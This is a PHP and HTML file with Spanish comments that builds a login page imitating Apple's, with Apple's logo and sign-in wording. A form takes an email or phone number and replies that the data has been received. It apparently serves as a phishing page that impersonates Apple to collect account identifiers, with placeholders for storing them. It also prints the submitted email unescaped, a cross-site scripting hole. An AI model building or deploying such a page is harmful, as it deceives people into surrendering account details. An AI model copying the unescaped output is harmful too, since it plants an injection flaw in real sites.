<?php
// Aquí puedes colocar tu lógica PHP existente del archivo index.php
// (Por ejemplo, conexiones a la base de datos, validaciones, etc.)
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple ID Login</title>
    <style>
        /* Estilos generales */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f9f9f9;
        }

        /* Contenedor principal */
        .login-container {
            text-align: center;
            background: #ffffff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            width: 350px;
        }

        /* Contenedor del logo */
        .logo-container {
            position: relative;
            width: 120px;
            height: 120px;
            margin: 0 auto 20px;
        }

        .circle-gradient {
            position: absolute;
            width: 100%;
            height: 100%;
            background: conic-gradient(
                #FF3B30, #FF9500, #FFCC00, #34C759, #5AC8FA, #007AFF, #5856D6, #FF2D55, #FF3B30
            );
            border-radius: 50%;
        }

        .logo {
            position: absolute;
            top: 25%;
            left: 25%;
            width: 50%;
            height: 50%;
        }

        /* Estilos de input */
        h1 { color: #333; font-size: 24px; margin-bottom: 20px; }
        .input-box {
            border: 1px solid #d1d1d1;
            border-radius: 6px;
            display: flex;
            padding: 10px;
            margin-bottom: 15px;
        }

        input {
            border: none; outline: none; flex: 1; font-size: 16px;
        }

        button img { width: 20px; cursor: pointer; }
        a { text-decoration: none; color: #0066cc; font-size: 14px; display: block; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo-container">
            <div class="circle-gradient"></div>
            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="logo">
        </div>
        <h1>Sign in with Apple ID</h1>

        <!-- Formulario que usa PHP -->
        <form method="POST" action="">
            <div class="input-box">
                <input type="email" name="email" placeholder="Email or Phone Number" required>
                <button type="submit">
                    <img src="https://cdn-icons-png.flaticon.com/512/271/271228.png" alt="Arrow">
                </button>
            </div>

            <div>
                <label>
                    <input type="checkbox" name="keep_signed"> Keep me signed in
                </label>
            </div>
        </form>

        <?php
        // Ejemplo de código PHP que procesa el formulario
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $email = $_POST['email'];
            echo "<p>Gracias, $email, hemos recibido tus datos.</p>";
            // Coloca aquí tu lógica de conexión o validación de base de datos
        }
        ?>

        <a href="#">Forgot Apple ID or password?</a>
        <a href="#">Create Apple ID</a>
    </div>
</body>
</html>
